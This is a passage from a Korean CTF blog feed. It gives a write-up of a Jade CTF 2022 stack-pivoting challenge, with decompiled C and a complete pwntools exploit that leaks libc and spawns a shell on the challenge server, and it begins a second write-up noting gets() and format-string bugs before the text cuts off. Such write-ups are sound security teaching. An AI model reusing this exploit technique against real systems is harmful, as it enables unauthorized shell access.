class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  fill_secret_buffer();</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Welcome to my game, choose any number between 1-10\n&quot;</span>, <span class="number">0x33</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter a number: &quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">10</span> || v4 &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Wrong number entered\n&quot;</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    odd_option();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    even_option();                              <span class="comment">// not vuln</span></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Bye bye\n&quot;</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 함수에서 수 하나를 입력받는데 0부터 9사이의 범위만 인정한다. 그 다음 &amp; 연산을 진행하는데 입력 값이 홀수라면 <code>odd_option()</code> 함수를 실행하고 아니라면 <code>even_option()</code> 함수를 실행한다. 후자의 함수에 취약점이 없기 때문에 간단하게 먼저 살펴보자.</p><h4 id="1-even-option"><a href="#1-even-option" class="headerlink" title="1. even_option()"></a>1. even_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">even_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">108</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter your name: &quot;</span>, <span class="number">0x11</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;Hello %s, we are sorry but you gave us the wrong input. Please try again.\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">2</span>, temp_buffer, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>지역변수 s에 이름을 입력받는다. bof가 일어날 가능성을 염두에 뒀지만 108 크기에 100만큼 입력하기 때문에 bof는 일어나지 않는다. 이 함수에서 취약점은 발생하지 않는다. </p><h4 id="2-odd-option"><a href="#2-odd-option" class="headerlink" title="2. odd_option()"></a>2. odd_option()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">odd_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">108</span>]; <span class="comment">// [rsp+D0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+13Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Let&#x27;s begin, but first here is how you play:\n&quot;</span>, <span class="number">0x2D</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- A number will be shown to you\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- You have to enter two strings\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The first should be your name\n&quot;</span>, <span class="number">0x22</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- - The second string should be equal to the secret code\n&quot;</span>, <span class="number">0x39</span>uLL);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;- If you successfully guess the secret code, you win!\n&quot;</span>, <span class="number">0x36</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;\nHere&#x27;s the number: %lld\n&quot;</span>, s);</span><br><span class="line">  write(<span class="number">2</span>, temp_buffer, v3);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter first input please: &quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  fgets(s, <span class="number">200</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Enter second input please: &quot;</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  fgets(dest, <span class="number">130</span>, <span class="built_in">stdin</span>); <span class="comment">// bof</span></span><br><span class="line">  result = <span class="built_in">strcpy</span>(dest, secret_buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Congrats! You win!\n&quot;</span>, <span class="number">0x13</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>208 크기의 지역변수 s에 200만큼 입력하고 108 크기의 지역변수 dest에 130만큼 입력한다. 여기서 bof가 발생한다. 바로 뒤에 srctpy함수에서 secret_buffer를 dest에 복사한다.<br>이 함수가 실행되기 전에 main에서 <code>fill_secret_buffer()</code> 함수를 호출하는데 여기서 secret_buffer 전역변수를 채운다.</p><p>결론적으로 알아낸 것은 지역변수 dest에서 130-0x70 즉, 18만큼 overflow가 난다는 것이다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>overflow가 18만큼난다? sfp(rbp), ret..</p><p>ret까지 안전하게 덮고 2바이트 더 overflow가 난다. ROP를 하기에는 overflow가 충분히 나지 않는다. 이럴 때 해야하는 것이 Stack pivoting이다. 이와 관련해서는 (구 블로그에도 써놨지만) 시간이 된다면 이 블로그에 글을 새로 쓸 예정이다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>overflow가 ret까지 날 때는 stack pivoting 기법을 고려해볼 수 있겠다. 이를 위해서 fake stack을 구성할 공간이 필요하다. 이 문제에서는 “Enter first input please: “에서 지역변수 s에 200만큼 입력할 수 있다. 200바이트면 ROP 페이로드를 적기에 충분하다. 여기를 fake stack으로 한다! 땅땅</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="PART1"><a href="#PART1" class="headerlink" title="PART1"></a>PART1</h4><ol><li>libc leak하는 ROP 페이로드를 작성하여 stack에 구성</li><li>위 stack으로 흐름 변경</li></ol><h4 id="PART2"><a href="#PART2" class="headerlink" title="PART2"></a>PART2</h4><ol><li><code>system(&#39;/bin/sh\x00&#39;)</code>을 호출하는 ROP 페이로드를 작성하여 stack에 구성</li><li>위 stack으로 흐름 변경</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400946</span></span><br><span class="line">ret = <span class="number">0x04006b9</span></span><br><span class="line"></span><br><span class="line">fake_stack= <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>])</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(e.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">stack_pivoting_gadget = <span class="number">0x0400B1C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;libc leak :: &#x27;</span> + <span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;offset :: &#x27;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;fgets&#x27;</span>]))</span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">## PART2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here\&#x27;s the number: &#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak 2 :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">fake_stack = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_stack += p64(pop_rdi)</span><br><span class="line">fake_stack += p64(binsh)</span><br><span class="line">fake_stack += p64(ret)</span><br><span class="line">fake_stack += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter first input please: &#x27;</span>, fake_stack)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x70</span></span><br><span class="line">payload += p64(stack_leak-<span class="number">8</span>)</span><br><span class="line">payload += p64(stack_pivoting_gadget) <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter second input please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;p1v0t!_p1v0t!_p1v0t!&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>다 풀고 나서 롸업 작성하는데 문제 풀 때는 못 봤던 함수를 발견했다..ㅋㅋ 이 함수를 진작에 봤더라면 더 쉽게 문제를 풀 수 있었을 텐데.. 그런데 이런 생각을 가지면 안된다. 이 문제 덕에 스택 피봇팅 리마인드했으니까~ 오히려 좋다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">hidden_level</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">112</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">2</span>, <span class="string">&quot;Oooh! You reached the hidden level, type the mantra to unlock the hidden door:\n&quot;</span>, <span class="number">0x4F</span>uLL);</span><br><span class="line">  result = fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 != <span class="number">-559038737</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">2</span>, <span class="string">&quot;Did you cheat?\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>늦장 부리다가 롸업을 너무 늦게 작성했다. 이 씨텝… 서버 오래 살아있어서 좋았는데 롸업 작성할 당시 서버가 닫혔다. 롸업은.. 제때제때 빨리빨리 작성하자 T_T.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Stack pivoting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Roll the dice (Shellcode, NOP Sled)</title>
      <link href="/221028-jadectf2022-roll_the_dice/"/>
      <url>/221028-jadectf2022-roll_the_dice/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(18&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Roll the dice, enter the coupon. Did you win? No? No worries. Try again. Life’s all about chances.</p><p>nc 34.76.206.46 10006</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">choose_option</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter your choice: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    roll_the_dice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( coupon )                               <span class="comment">// checking the global variable for ROP</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, but you only get one chance to enter the coupon code!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      coupon = <span class="number">1</span>;</span><br><span class="line">      enter_coupon();                           <span class="comment">// only 1 time</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s too sad to see you go :(&quot;</span>);</span><br><span class="line">    quit = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( quit )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> choose_option();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 함수에서 메뉴를 고를 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Welcome To The Festive Lottery!</span><br><span class="line"></span><br><span class="line">1. Roll the dice!</span><br><span class="line">2. Enter a coupon code</span><br><span class="line">3. Exit</span><br><span class="line">Enter your choice: </span><br></pre></td></tr></table></figure><p>1번 메뉴는 <code>roll_the_dice()</code> 함수를 실행시켜준다.<br>2번 메뉴에서 여러가지 검사를 한다. coupon 전역 변수를 검사하는데, player가 한 번만 <code>enter_coupon()</code> 함수만 실행시킬 수 있다는 것을 의미한다.</p><h4 id="1-Roll-the-dice"><a href="#1-Roll-the-dice" class="headerlink" title="1. Roll the dice!"></a>1. Roll the dice!</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">roll_the_dice</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( rand() % <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Hurray! You got a 1&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Congrats! You won a flag!&quot;</span>);</span><br><span class="line">      result = win();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Ah! You just missed it&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">if</span> ( got_6 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;Sorry, you can avail this offer only once!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        got_6 = <span class="number">1</span>;</span><br><span class="line">        another_chance = <span class="number">1</span>;</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">&quot;You get another chance to enter the coupon!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;Did you tamper with the dice? This number should not be there!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>case 3일때 출력해주는 저 flag는 가짜 플래그이다.</p><p>case 5의 another_chance에 주목해보자. 미리 이야기하자면 이 전역 변수는 2번 메뉴인 <code>enter_coupon()</code> 함수에서 사용된다.</p><p>got_6 전역 변수는 이런 another_chance를 단 한번만 1로 세팅할 수 있다는 것을 의미하는 것 같다.</p><h4 id="2-Enter-a-coupon-code"><a href="#2-Enter-a-coupon-code" class="headerlink" title="2. Enter a coupon code"></a>2. Enter a coupon code</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">enter_coupon</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> coupon_code[<span class="number">14</span>]; <span class="comment">// [rsp+70h] [rbp-70h] BYREF</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+7Eh] [rbp-62h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+80h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+D0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+D8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(coupon_code, <span class="string">&quot;YCHHZZHHMSHWI&quot;</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter the coupon code: &quot;</span>);</span><br><span class="line">    gets(input);                                <span class="comment">// bof</span></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(input, coupon_code) )          <span class="comment">// same as cooupon code</span></span><br><span class="line">    &#123;</span><br><span class="line">      successfull = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Coupon applied successfully!&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid coupon code! You entered: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(input);                              <span class="comment">// 